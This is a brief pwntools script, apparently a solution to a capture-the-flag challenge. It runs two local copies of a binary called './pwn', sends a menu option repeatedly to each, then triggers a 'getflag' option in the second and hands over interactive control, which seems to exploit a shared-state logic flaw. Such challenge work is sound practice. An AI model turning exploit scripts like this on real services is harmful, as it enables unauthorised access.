from pwn import *

p_1 = process("./pwn")
p_2 = process("./pwn")
context.log_level = "debug"

p_1.recvuntil("name.\n")
p_1.send(b'asd')
p_2.sendafter('name.\n', b'asd')

for i in range(10):
	p_1.sendafter('getflag\n', '1\n')

for i in range(10):
	p_2.sendafter('getflag\n', '1\n')

p_2.sendafter("3. getflag\n", '3\n')

p_2.interactive()
